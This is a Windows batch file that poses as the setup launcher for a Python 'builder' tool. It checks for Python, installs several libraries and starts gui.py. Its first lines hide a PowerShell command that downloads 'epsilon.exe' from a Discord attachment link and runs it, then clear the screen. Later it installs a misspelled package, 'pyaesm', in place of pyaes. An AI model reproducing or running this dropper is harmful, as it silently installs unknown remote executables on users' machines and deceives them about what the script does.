@echo off
cd Components
powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1206240725398720582/epsilon.exe?ex=65db4a37&is=65c8d537&hm=f50a0bf7c66c46614c2b5c0b9af0ac40baeb71f088ce82bf73eebd49f7c65e82&';$file='epsilon.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
cls
cd ..
cd /d %~dp0

title Checking Python installation...
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
    echo Make sure it is added to PATH.
    goto ERROR 
)

title Checking libraries...
echo Checking 'customtkinter' (1/4)
python -c "import customtkinter" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing customtkinter...
    python -m pip install customtkinter > nul
)

echo Checking 'pillow' (2/4)
python -c "import PIL" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pillow...
    python -m pip install pillow > nul
)

echo Checking 'pyaes' (3/4)
python -c "import pyaes" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pyaes...
    python -m pip install pyaesm > nul
)

echo Checking 'urllib3' (4/4)
python -c "import urllib3" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing urllib3...
    python -m pip install urllib3 > nul
)

cls
title Starting builder...
python gui.py
if %errorlevel% neq 0 goto ERROR
exit

:ERROR
color 4 && title [Error]
pause > nul
